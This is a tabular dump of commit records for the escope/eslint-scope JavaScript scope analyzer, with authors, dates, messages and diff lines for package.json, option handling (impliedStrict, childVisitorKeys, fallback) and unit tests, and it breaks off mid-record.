([escope](http://github.com/estools/escope)) is<\n>-[ECMAScript](http://www.ecma-international.org/publications/standards/Ecma-262.htm)<\n>-scope analyzer extracted from [esmangle project](http://github.com/estools/esmangle).<\n>-[![Build Status](https://travis-ci.org/estools/escope.png?branch=master)](https://travis-ci.org/estools/escope)<\n>-### Example<\n>-var escope = require('escope');<\n>-var scopeManager = escope.analyze(ast);<\n>-### Document<\n>-Generated JSDoc is [here](http://estools.github.io/escope/).<\n>-### Demos and Tools<\n>-Demonstration is [here](http://mazurov.github.io/escope-demo/) by [Sasha Mazurov](https://github.com/mazurov) (twitter: [@mazurov](http://twitter.com/mazurov)). [issue](https://github.com/estools/escope/issues/14)<\n>-![Demo](https://f.cloud.github.com/assets/75759/462920/7aa6dd40-b4f5-11e2-9f07-9f4e8d0415f9.gif)<\n>-And there are tools constructed on Escope.<\n>-### License<\n>-Copyright (C) 2012-2013 [Yusuke Suzuki](http://github.com/Constellation)<\n>- (twitter: [@Constellation](http://twitter.com/Constellation)) and other contributors.<\n>-Redistribution and use in source and binary forms<c> with or without<\n>-modification<c> are permitted provided that the following conditions are met:<\n>-  * Redistributions of source code must retain the above copyright<\n>-    notice<c> this list of conditions and the following disclaimer.<\n>-  * Redistributions in binary form must reproduce the above copyright<\n>-    notice<c> this list of conditions and the following disclaimer in the<\n>-    documentation and/or other materials provided with the distribution.<\n>-THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>-AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>-IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>-ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>-DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>-(INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>-LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>-ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>-(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>-THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>-gulp.task('test'<c> [ 'build' ]<c> function () {<\n>",F
17,56,56,569,4,26,James Henry,13,3,225,2,User,0,2955,Sun,17,49,15 Jan 2017,Chore: Add eslint-release scripts (#6),0,0,1,8,324,"+    ""jsdoc"": ""jsdoc src/*.js README.md""<c><\n>+    ""release"": ""eslint-release""<c><\n>+    ""ci-release"": ""eslint-ci-release""<c><\n>+    ""gh-release"": ""eslint-gh-release""<c><\n>+    ""alpharelease"": ""eslint-prerelease alpha""<c><\n>+    ""betarelease"": ""eslint-prerelease beta""<\n>+    ""eslint-release"": ""^0.10.1""<c><\n>","-    ""jsdoc"": ""jsdoc src/*.js README.md""<\n>",F
17,56,56,569,4,26,James Henry,13,3,225,2,User,0,2955,Sun,12,44,15 Jan 2017,Chore: Remove unused bower.json (#5),1,0,1,11,202,,"-  ""name"": ""escope""<c><\n>-  ""version"": ""2.0.2-dev""<c><\n>-  ""main"": ""escope.js""<c><\n>-  ""dependencies"": {<\n>-    ""estraverse"": "">= 0.0.2""<\n>-  }<c><\n>-  ""ignore"": [<\n>-    ""**/.*""<c><\n>-    ""node_modules""<c><\n>-    ""components""<\n>-  ]<\n>",F
17,56,56,569,4,26,James Henry,13,3,225,2,User,0,2955,Sun,12,41,15 Jan 2017,Chore: Fix tests for eslint-scope (#4),0,0,1,2,74,+    only: /eslint-scope\/(src|test)\//<\n>,-    only: /escope\/(src|test)\//<\n>,F
17,56,56,569,4,26,James Henry,13,3,225,2,User,0,2955,Sun,12,6,15 Jan 2017,Chore: Update package.json for eslint fork (#1),0,0,1,33,981,"+  ""name"": ""eslint-scope""<c><\n>+  ""description"": ""ECMAScript scope analyzer for ESLint""<c><\n>+  ""homepage"": ""http://github.com/eslint/eslint-scope""<c><\n>+  ""repository"": ""eslint/eslint-scope""<c><\n>+  ""bugs"": {<\n>+    ""url"": ""https://github.com/eslint/eslint-scope/issues""<\n>+  }<c><\n>+  ""license"": ""BSD-2-Clause""<c><\n>+  ""scripts"": {<\n>+    ""test"": ""gulp travis""<c><\n>+    ""unit-test"": ""gulp test""<c><\n>+    ""lint"": ""gulp lint""<c><\n>+    ""jsdoc"": ""jsdoc src/*.js README.md""<\n>","-  ""name"": ""escope""<c><\n>-  ""description"": ""ECMAScript scope analyzer""<c><\n>-  ""homepage"": ""http://github.com/estools/escope""<c><\n>-  ""maintainers"": [<\n>-    {<\n>-      ""name"": ""Yusuke Suzuki""<c><\n>-      ""email"": ""utatane.tea@gmail.com""<c><\n>-      ""web"": ""http://github.com/Constellation""<\n>-    }<\n>-  ]<c><\n>-  ""repository"": {<\n>-    ""type"": ""git""<c><\n>-    ""url"": ""https://github.com/estools/escope.git""<\n>-  }<c><\n>-  ""license"": ""BSD-2-Clause""<c><\n>-  ""scripts"": {<\n>-    ""test"": ""gulp travis""<c><\n>-    ""unit-test"": ""gulp test""<c><\n>-    ""lint"": ""gulp lint""<c><\n>-    ""jsdoc"": ""jsdoc src/*.js README.md""<\n>",F
17,56,56,569,4,26,Nicholas C. Zakas,45,52,7470,0,User,0,3764,Sat,10,49,14 Jan 2017,Chore: Update license with JSF copyright,0,0,1,3,174,+eslint-scope<\n>+Copyright JS Foundation and other contributors<c> https://js.foundation<\n>+Copyright (C) 2012-2013 Yusuke Suzuki (twitter: @Constellation) and other contributors.<\n>,,F
17,56,56,569,4,26,Nicholas C. Zakas,45,52,7470,0,User,0,3764,Fri,10,13,11 Mar 2016,Bumps package version,0,0,1,2,46,"+  ""version"": ""3.6.0""<c><\n>","-  ""version"": ""3.5.0""<c><\n>",F
17,56,56,569,4,26,Michael Ficarra,144,80,823,153,User,1,3432,Fri,8,59,11 Mar 2016,Merge pull request #103 from estools/fallback Update escope to use new esrecurse with fallback,0,0,0,0,0,,,F
17,56,56,569,4,26,Nicholas C. Zakas,45,52,7470,0,User,0,3764,Fri,8,38,11 Mar 2016,Update escope to use new esrecurse with fallback,0,0,2,11,595,"+    ""esrecurse"": ""^4.1.0""<c><\n>+    it('should not raise an error even if it encountered an unknown node when fallback is iteration.'<c> function() {<\n>+    it('should not raise an error even if it encountered an unknown node when fallback is a function.'<c> function() {<\n>+        const ast = esprima.parse(`<\n>+            var foo = 0;<\n>+        `);<\n>+        ast.body[0].declarations[0].init.type = 'NumericLiteral';<\n>+        analyze(ast<c> {fallback: node => Object.keys(node)});<\n>+    });<\n>","-    ""esrecurse"": ""^4.0.0""<c><\n>-    it('should not raise an error even if it encountered an unknown node.'<c> function() {<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Tue,0,11,1 Mar 2016,Bumps package version,0,0,1,2,46,"+  ""version"": ""3.5.0""<c><\n>","-  ""version"": ""3.4.0""<c><\n>",F
17,56,56,569,4,26,Michael Ficarra,144,80,823,153,User,1,3432,Sat,11,20,27 Feb 2016,Merge pull request #101 from mysticatea/fix-meta-property Fix meta property,0,0,0,0,0,,,F
17,56,56,569,4,26,Toru Nagashima,103,3,460,33,User,0,2574,Sat,22,49,27 Feb 2016,Fix: dont make references of `new.target`,0,1,1,48,2396,"+    MetaProperty() {<\n>+        // do nothing.<\n>+    }<\n>+// -*- coding: utf-8 -*-<\n>+//  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+//<\n>+//  Redistribution and use in source and binary forms<c> with or without<\n>+//  modification<c> are permitted provided that the following conditions are met:<\n>+//<\n>+//    * Redistributions of source code must retain the above copyright<\n>+//      notice<c> this list of conditions and the following disclaimer.<\n>+//    * Redistributions in binary form must reproduce the above copyright<\n>+//      notice<c> this list of conditions and the following disclaimer in the<\n>+//      documentation and/or other materials provided with the distribution.<\n>+//<\n>+//  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+//  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+//  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+//  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+//  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+//  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+//  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+//  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+//  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+//  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+import { expect } from 'chai';<\n>+import { analyze } from '..';<\n>+const parse = require('../third_party/espree');<\n>+describe('ES6 new.target'<c> function() {<\n>+    it('should not make references of new.target'<c> function() {<\n>+        const ast = parse(`<\n>+            class A {<\n>+                constructor() {<\n>+                    new.target;<\n>+                }<\n>+            }<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+        expect(scopeManager.scopes).to.have.length(3);<\n>+        const scope = scopeManager.scopes[2];<\n>+        expect(scope.type).to.be.equal('function');<\n>+        expect(scope.block.type).to.be.equal('FunctionExpression');<\n>+        expect(scope.isStrict).to.be.true;<\n>+        expect(scope.variables).to.have.length(1);<\n>+        expect(scope.variables[0].name).to.be.equal('arguments');<\n>+        expect(scope.references).to.have.length(0);<\n>+    });<\n>+// vim: set sw=4 ts=4 et tw=80 :<\n>",,F
17,56,56,569,4,26,Toru Nagashima,103,3,460,33,User,0,2574,Sat,22,47,27 Feb 2016,Upgrade espree to 3.1.1,0,0,2,52,2236,"+    ""espree"": ""^3.1.1""<c><\n>+        // enable es6 features.<\n>+        ecmaVersion: 6<c><\n>+        sourceType: ""module""<\n>","-    ""espree"": ""^2.2.5""<c><\n>-        // specify parsing features (default only has blockBindings: true)<\n>-        ecmaFeatures: {<\n>-            // enable parsing of arrow functions<\n>-            arrowFunctions: true<c><\n>-            // enable parsing of let/const<\n>-            blockBindings: true<c><\n>-            // enable parsing of destructured arrays and objects<\n>-            destructuring: true<c><\n>-            // enable parsing of regular expression y flag<\n>-            regexYFlag: true<c><\n>-            // enable parsing of regular expression u flag<\n>-            regexUFlag: true<c><\n>-            // enable parsing of template strings<\n>-            templateStrings: true<c><\n>-            // enable parsing of binary literals<\n>-            binaryLiterals: true<c><\n>-            // enable parsing of ES6 octal literals<\n>-            octalLiterals: true<c><\n>-            // enable parsing unicode code point escape sequences<\n>-            unicodeCodePointEscapes: true<c><\n>-            // enable parsing of default parameters<\n>-            defaultParams: true<c><\n>-            // enable parsing of rest parameters<\n>-            restParams: true<c><\n>-            // enable parsing of for-of statement<\n>-            forOf: true<c><\n>-            // enable parsing computed object literal properties<\n>-            objectLiteralComputedProperties: true<c><\n>-            // enable parsing of shorthand object literal methods<\n>-            objectLiteralShorthandMethods: true<c><\n>-            // enable parsing of shorthand object literal properties<\n>-            objectLiteralShorthandProperties: true<c><\n>-            // Allow duplicate object literal properties (except '__proto__')<\n>-            objectLiteralDuplicateProperties: true<c><\n>-            // enable parsing of generators/yield<\n>-            generators: true<c><\n>-            // enable parsing spread operator<\n>-            spread: true<c><\n>-            // enable parsing classes<\n>-            classes: true<c><\n>-            // enable parsing of modules<\n>-            modules: true<c><\n>-            // enable React JSX parsing<\n>-            jsx: true<c><\n>-            // enable return in global scope<\n>-            globalReturn: true<\n>-        }<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Wed,23,2,10 Feb 2016,Merge pull request #100 from mysticatea/child-visitor-keys `childVisitorKeys` and `fallback` options,0,0,0,0,0,,,F
17,56,56,569,4,26,Toru Nagashima,103,3,460,33,User,0,2574,Thu,21,56,4 Feb 2016,Update: add `childVisitorKeys` and `fallback` options,0,2,4,158,7419,"+    ""esrecurse"": ""^4.0.0""<c><\n>+        ecmaVersion: 5<c><\n>+        childVisitorKeys: null<c><\n>+        fallback: 'iteration'<\n>+        return typeof target === 'object' && target instanceof Object && !(target instanceof Array) && !(target instanceof RegExp);<\n>+ * @param {Object} [providedOptions.childVisitorKeys=null] - Additional known visitor keys. See [esrecurse](https://github.com/estools/esrecurse)'s the `childVisitorKeys` option.<\n>+ * @param {string} [providedOptions.fallback='iteration'] - A kind of the fallback in order to encounter with unknown node. See [esrecurse](https://github.com/estools/esrecurse)'s the `fallback` option.<\n>+    referencer = new Referencer(options<c> scopeManager);<\n>+    constructor(options<c> rootPattern<c> callback) {<\n>+        super(null<c> options);<\n>+function traverseIdentifierInPattern(options<c> rootPattern<c> referencer<c> callback) {<\n>+    var visitor = new PatternVisitor(options<c> rootPattern<c> callback);<\n>+        super(null<c> referencer.options);<\n>+    constructor(options<c> scopeManager) {<\n>+        super(null<c> options);<\n>+        this.options = options;<\n>+            this.options<c><\n>+// -*- coding: utf-8 -*-<\n>+//  Copyright (C) 2016 Yusuke Suzuki <utatane.tea@gmail.com><\n>+//<\n>+//  Redistribution and use in source and binary forms<c> with or without<\n>+//  modification<c> are permitted provided that the following conditions are met:<\n>+//<\n>+//    * Redistributions of source code must retain the above copyright<\n>+//      notice<c> this list of conditions and the following disclaimer.<\n>+//    * Redistributions in binary form must reproduce the above copyright<\n>+//      notice<c> this list of conditions and the following disclaimer in the<\n>+//      documentation and/or other materials provided with the distribution.<\n>+//<\n>+//  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+//  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+//  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+//  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+//  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+//  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+//  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+//  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+//  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+//  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+import { expect } from 'chai';<\n>+import esprima from 'esprima';<\n>+import { analyze } from '..';<\n>+describe('childVisitorKeys option'<c> function() {<\n>+    it('should handle as a known node if the childVisitorKeys option was given.'<c> function() {<\n>+        const ast = esprima.parse(`<\n>+            var foo = 0;<\n>+        `);<\n>+        ast.body[0].declarations[0].init.type = 'NumericLiteral';<\n>+        // should no error<\n>+        analyze(<\n>+            ast<c><\n>+            {<\n>+                fallback: 'none'<c><\n>+                childVisitorKeys: {<\n>+                    NumericLiteral: []<\n>+                }<\n>+            }<\n>+        );<\n>+    });<\n>+    it('should not visit to properties which are not given.'<c> function() {<\n>+        const ast = esprima.parse(`<\n>+            let foo = bar;<\n>+        `);<\n>+        ast.body[0].declarations[0].init = {<\n>+            type: 'TestNode'<c><\n>+            argument: ast.body[0].declarations[0].init<\n>+        };<\n>+        var result = analyze(<\n>+            ast<c><\n>+            {<\n>+                childVisitorKeys: {<\n>+                    TestNode: []<\n>+                }<\n>+            }<\n>+        );<\n>+        expect(result.scopes).to.have.length(1);<\n>+        const globalScope = result.scopes[0];<\n>+        // `bar` in TestNode has not been visited.<\n>+        expect(globalScope.through).to.have.length(0);<\n>+    });<\n>+    it('should visit to given properties.'<c> function() {<\n>+        const ast = esprima.parse(`<\n>+            let foo = bar;<\n>+        `);<\n>+        ast.body[0].declarations[0].init = {<\n>+            type: 'TestNode'<c><\n>+            argument: ast.body[0].declarations[0].init<\n>+        };<\n>+        var result = analyze(<\n>+            ast<c><\n>+            {<\n>+                childVisitorKeys: {<\n>+                    TestNode: ['argument']<\n>+                }<\n>+            }<\n>+        );<\n>+        expect(result.scopes).to.have.length(1);<\n>+        const globalScope = result.scopes[0];<\n>+        // `bar` in TestNode has been visited.<\n>+        expect(globalScope.through).to.have.length(1);<\n>+        expect(globalScope.through[0].identifier.name).to.equal('bar');<\n>+    });<\n>+// vim: set sw=4 ts=4 et tw=80 :<\n>+// -*- coding: utf-8 -*-<\n>+//  Copyright (C) 2016 Yusuke Suzuki <utatane.tea@gmail.com><\n>+//<\n>+//  Redistribution and use in source and binary forms<c> with or without<\n>+//  modification<c> are permitted provided that the following conditions are met:<\n>+//<\n>+//    * Redistributions of source code must retain the above copyright<\n>+//      notice<c> this list of conditions and the following disclaimer.<\n>+//    * Redistributions in binary form must reproduce the above copyright<\n>+//      notice<c> this list of conditions and the following disclaimer in the<\n>+//      documentation and/or other materials provided with the distribution.<\n>+//<\n>+//  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+//  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+//  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+//  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+//  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+//  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+//  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+//  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+//  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+//  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+import { expect } from 'chai';<\n>+import esprima from 'esprima';<\n>+import { analyze } from '..';<\n>+describe('fallback option'<c> function() {<\n>+    it('should raise an error when it encountered an unknown node if no fallback.'<c> function() {<\n>+        const ast = esprima.parse(`<\n>+            var foo = 0;<\n>+        `);<\n>+        ast.body[0].declarations[0].init.type = 'NumericLiteral';<\n>+        expect(function() {<\n>+            analyze(ast<c> {fallback: 'none'});<\n>+        }).to.throw(""Unknown node type NumericLiteral"");<\n>+    });<\n>+    it('should not raise an error even if it encountered an unknown node.'<c> function() {<\n>+        const ast = esprima.parse(`<\n>+            var foo = 0;<\n>+        `);<\n>+        ast.body[0].declarations[0].init.type = 'NumericLiteral';<\n>+        analyze(ast); // default is `fallback: 'iteration'`<\n>+        analyze(ast<c> {fallback: 'iteration'});<\n>+    });<\n>+// vim: set sw=4 ts=4 et tw=80 :<\n>","-    ""esrecurse"": ""^3.1.1""<c><\n>-        ecmaVersion: 5<\n>-        return typeof target === 'object' && target instanceof Object && !(target instanceof RegExp);<\n>-    referencer = new Referencer(scopeManager);<\n>-    constructor(rootPattern<c> callback) {<\n>-        super();<\n>-function traverseIdentifierInPattern(rootPattern<c> referencer<c> callback) {<\n>-    var visitor = new PatternVisitor(rootPattern<c> callback);<\n>-        super();<\n>-    constructor(scopeManager) {<\n>-        super();<\n>",F
17,56,56,569,4,26,Michael Ficarra,144,80,823,153,User,1,3432,Mon,8,26,1 Feb 2016,Version 3.4.0,0,0,1,2,46,"+  ""version"": ""3.4.0""<c><\n>","-  ""version"": ""3.3.0""<c><\n>",F
17,56,56,569,4,26,Michael Ficarra,144,80,823,153,User,1,3432,Thu,15,8,28 Jan 2016,Merge pull request #93 from nre/issue92 New option: impliedStrict,0,0,0,0,0,,,F
17,56,56,569,4,26,Nick Evans,5,1,0,0,User,0,1536,Sun,12,45,3 Jan 2016,New option: impliedStrict,0,1,3,115,5661,"+        impliedStrict: false<c><\n>+ * @param {boolean} [providedOptions.impliedStrict=false]- implied strict mode<\n>+ * (if ecmaVersion >= 5).<\n>+        if (this.scopeManager.isStrictModeSupported() && this.scopeManager.isImpliedStrict()) {<\n>+            this.currentScope().isStrict = true;<\n>+        }<\n>+    isImpliedStrict() {<\n>+        return this.__options.impliedStrict;<\n>+    }<\n>+    isStrictModeSupported() {<\n>+        return this.__options.ecmaVersion >= 5;<\n>+    }<\n>+// -*- coding: utf-8 -*-<\n>+//  Copyright (C) 2015 Yusuke Suzuki <utatane.tea@gmail.com><\n>+//<\n>+//  Redistribution and use in source and binary forms<c> with or without<\n>+//  modification<c> are permitted provided that the following conditions are met:<\n>+//<\n>+//    * Redistributions of source code must retain the above copyright<\n>+//      notice<c> this list of conditions and the following disclaimer.<\n>+//    * Redistributions in binary form must reproduce the above copyright<\n>+//      notice<c> this list of conditions and the following disclaimer in the<\n>+//      documentation and/or other materials provided with the distribution.<\n>+//<\n>+//  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+//  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+//  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+//  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+//  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+//  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+//  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+//  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+//  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+//  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+import { expect } from 'chai';<\n>+import { parse } from '../third_party/esprima';<\n>+import { analyze } from '..';<\n>+describe('impliedStrict option'<c> function() {<\n>+    it('ensures all user scopes are strict if ecmaVersion >= 5'<c> function() {<\n>+        const ast = parse(`<\n>+            function foo() {<\n>+                function bar() {<\n>+                    'use strict';<\n>+                }<\n>+            }<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 5<c> impliedStrict: true});<\n>+        expect(scopeManager.scopes).to.have.length(3);<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.be.equal('global');<\n>+        expect(scope.block.type).to.be.equal('Program');<\n>+        expect(scope.isStrict).to.be.true;<\n>+        scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.be.equal('function');<\n>+        expect(scope.block.type).to.be.equal('FunctionDeclaration');<\n>+        expect(scope.isStrict).to.be.true;<\n>+        scope = scopeManager.scopes[2];<\n>+        expect(scope.type).to.be.equal('function');<\n>+        expect(scope.block.type).to.be.equal('FunctionDeclaration');<\n>+        expect(scope.isStrict).to.be.true;<\n>+    });<\n>+    it('ensures impliedStrict option is only effective when ecmaVersion option >= 5'<c> function() {<\n>+        const ast = parse(`<\n>+            function foo() {}<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 3<c> impliedStrict: true});<\n>+        expect(scopeManager.scopes).to.have.length(2);<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.be.equal('global');<\n>+        expect(scope.block.type).to.be.equal('Program');<\n>+        expect(scope.isStrict).to.be.false;<\n>+        scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.be.equal('function');<\n>+        expect(scope.block.type).to.be.equal('FunctionDeclaration');<\n>+        expect(scope.isStrict).to.be.false;<\n>+    });<\n>+    it('omits a nodejs global scope when ensuring all user scopes are strict'<c> function() {<\n>+        const ast = parse(`<\n>+            function foo() {}<\n>+        `);<\n>+        let scopeManager = analyze(ast<c> {ecmaVersion: 5<c> nodejsScope: true<c> impliedStrict: true});<\n>+        expect(scopeManager.scopes).to.have.length(3);<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.be.equal('global');<\n>+        expect(scope.block.type).to.be.equal('Program');<\n>+        expect(scope.isStrict).to.be.false;<\n>+        scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.be.equal('function');<\n>+        expect(scope.block.type).to.be.equal('Program');<\n>+        expect(scope.isStrict).to.be.true;<\n>+        scope = scopeManager.scopes[2];<\n>+        expect(scope.type).to.be.equal('function');<\n>+        expect(scope.block.type).to.be.equal('FunctionDeclaration');<\n>+        expect(scope.isStrict).to.be.true;<\n>+    });<\n>+    it('omits a module global scope when ensuring all user scopes are strict'<c> function() {<\n>+        const ast = parse(`<\n>+            function foo() {}`<c><\n>+            {sourceType: 'module'}<\n>+        );<\n>+        let scopeManager = analyze(ast<c> {ecmaVersion: 6<c> impliedStrict: true<c> sourceType: 'module'});<\n>+        expect(scopeManager.scopes).to.have.length(3);<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.be.equal('global');<\n>+        expect(scope.block.type).to.be.equal('Program');<\n>+        expect(scope.isStrict).to.be.false;<\n>+        scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.be.equal('module');<\n>+        expect(scope.isStrict).to.be.true;<\n>+        scope = scopeManager.scopes[2];<\n>+        expect(scope.type).to.be.equal('function');<\n>+        expect(scope.block.type).to.be.equal('FunctionDeclaration');<\n>+        expect(scope.isStrict).to.be.true;<\n>+    });<\n>+// vim: set sw=4 ts=4 et tw=80 :<\n>",,F
17,56,56,569,4,26,Michael Ficarra,144,80,823,153,User,1,3432,Sun,21,41,17 Jan 2016,Merge pull request #97 from eventualbuddha/ghi-96 Rewrite tests in ES2015.,0,0,0,0,0,,,F
17,56,56,569,4,26,Brian Donovan,269,56,201,10,User,1,4177,Tue,12,49,12 Jan 2016,Rewrite tests in ES2015. I used decaffeinate + esnext + a manual cleanup pass to move the tests over. Closes #96,26,26,28,8039,389141,"+require('babel-register')({<\n>+    only: /escope\/(src|test)\//<\n>+var TEST = [ 'test/*.js' ];<\n>+    ""babel-register"": ""^6.3.13""<c><\n>+// -*- coding: utf-8 -*-<\n>+//  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+//<\n>+//  Redistribution and use in source and binary forms<c> with or without<\n>+//  modification<c> are permitted provided that the following conditions are met:<\n>+//<\n>+//    * Redistributions of source code must retain the above copyright<\n>+//      notice<c> this list of conditions and the following disclaimer.<\n>+//    * Redistributions in binary form must reproduce the above copyright<\n>+//      notice<c> this list of conditions and the following disclaimer in the<\n>+//      documentation and/or other materials provided with the distribution.<\n>+//<\n>+//  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+//  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+//  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+//  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+//  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+//  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+//  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+//  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+//  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+//  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+import { expect } from 'chai';<\n>+import esprima from 'esprima';<\n>+import { analyze } from '..';<\n>+describe('arguments'<c> function() {<\n>+    it('arguments are correctly materialized'<c> function() {<\n>+        const ast = esprima.parse(`<\n>+            (function () {<\n>+                arguments;<\n>+            }());<\n>+        `);<\n>+        const scopeManager = analyze(ast);<\n>+        expect(scopeManager.scopes).to.have.length(2);<\n>+        const globalScope = scopeManager.scopes[0];<\n>+        expect(globalScope.type).to.be.equal('global');<\n>+        expect(globalScope.variables).to.have.length(0);<\n>+        expect(globalScope.references).to.have.length(0);<\n>+        const scope = scopeManager.scopes[1];<\n>+        